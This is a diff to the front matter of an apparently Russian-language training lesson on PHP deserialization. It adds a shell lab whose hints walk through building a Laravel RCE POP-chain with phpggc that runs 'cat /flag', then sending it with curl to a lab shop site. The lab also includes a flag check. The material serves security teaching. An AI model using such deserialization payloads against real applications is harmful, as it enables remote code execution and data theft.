@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 44
 summary: "PHP-десериализация: магические методы, POP-цепочки, генерация phpggc и эксплуатация фреймворковых gadget'ов."
+lab:
+  kind: shell
+  title: 'Практика: PHP POP-chain (phpggc)'
+  toolset: [core, phpggc, curl]
+  workdir: /home/student/task
+  files: [task.md, cookie.txt]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Подтверди формат: `base64 -d cookie.txt` — увидишь `O:25:"App\Model\User"`.'
+    - 'Собери POP-chain: `phpggc Laravel/RCE9 system ''cat /flag'' -b -o payload.b64`.'
+    - 'Отправь payload: `curl -s https://shop.example/ --data-binary @payload.b64`.'
+    - 'Запиши ответ в found.txt и набери `check`.'
 ---
 
 ## Вопрос, с которого всё начинается
